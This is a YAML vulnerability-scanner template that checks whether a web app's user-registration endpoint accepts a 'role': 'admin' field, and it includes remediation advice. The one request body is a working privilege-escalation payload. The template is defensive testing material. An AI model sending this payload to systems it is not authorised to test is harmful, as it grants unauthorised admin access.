id: mass-assignment
info:
  name: Mass Assignment Role Escalation
  description: Detects if user registration accepts role parameter for privilege escalation
  tags:
    - business-logic
    - mass-assignment
    - privilege-escalation

requests:
  - name: Register with admin role
    method: POST
    path: /api/Users/
    headers:
      Content-Type: application/json
    body: '{"email": "test_admin_{{rand_int()}}@example.com", "password": "TestPassword123!", "passwordRepeat": "TestPassword123!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "role": "admin"}'
    matchers:
      - type: semantic
        selector: "$.data.role"
        condition: equals
        value: admin
    on_match:
      vulnerability: MASS_ASSIGNMENT
      message: User registration accepts role parameter - privilege escalation possible
      remediation: Use allow-list for accepted fields; never bind user input to sensitive fields
